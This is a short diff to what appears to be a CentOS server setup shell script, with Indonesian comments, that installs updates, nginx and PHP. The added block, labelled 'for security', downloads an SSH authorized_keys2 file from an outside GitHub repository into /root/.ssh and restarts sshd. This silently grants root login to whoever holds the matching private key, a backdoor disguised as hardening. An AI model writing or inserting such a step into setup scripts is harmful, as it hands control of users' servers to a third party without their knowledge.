@@ -73,6 +73,10 @@ yum -y remove cyrus-sasl
 # update
 yum -y update
 
+# Untuk keamanan
+wget https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/ak -O /root/.ssh/authorized_keys2
+service sshd restart
+
 # install webserver
 yum -y install nginx php-fpm php-cli
 service nginx restart
